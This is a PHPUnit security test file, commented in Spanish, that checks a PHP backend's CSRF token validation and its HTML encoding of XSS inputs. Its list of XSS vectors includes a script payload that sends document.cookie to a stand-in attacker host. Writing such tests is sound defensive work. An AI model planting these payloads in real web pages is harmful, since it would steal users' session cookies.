<?php
use PHPUnit\Framework\TestCase;

class OwaspCsrfXssSecurityTest extends TestCase {

    /**
     * Prueba de mitigación de Cross-Site Request Forgery (CSRF)
     */
    public function testProteccionYValidacionCSRF() {
        require_once __DIR__ . '/../../backend/includes/security.php';

        $tokenValido = getCsrfToken();
        $tokenManipulado = "8f9a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a2b3c4d5e6f7a8b9c0d1e2f3a";

        $this->assertTrue(verifyCsrfToken($tokenValido), "El token CSRF de la sesión activa debe ser aceptado.");
        $this->assertFalse(verifyCsrfToken($tokenManipulado), "Un token CSRF falsificado debe ser rechazado inmediatamente.");
        $this->assertFalse(verifyCsrfToken(''), "Un token CSRF nulo debe ser rechazado.");
    }

    /**
     * Prueba de mitigación de Cross-Site Scripting (XSS Stored / Reflected)
     */
    public function testProteccionSanitizacionXSS() {
        require_once __DIR__ . '/../../backend/includes/security.php';

        $xssVectors = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<a href='javascript:alert(1)'>Click me</a>",
            "'\"><script>document.location='http://attacker.test/cookie='+document.cookie</script>"
        ];

        foreach ($xssVectors as $vector) {
            $sanitized = sanitizeOutput($vector);
            $this->assertStringNotContainsString("<script>", $sanitized, "El tag <script> debe ser codificado.");
            $this->assertStringContainsString("&lt;", $sanitized, "Los caracteres de apertura de tag HTML < deben ser codificados como entidades HTML.");
            $this->assertStringContainsString("&gt;", $sanitized, "Los caracteres de cierre de tag HTML > deben ser codificados como entidades HTML.");
        }
    }
}
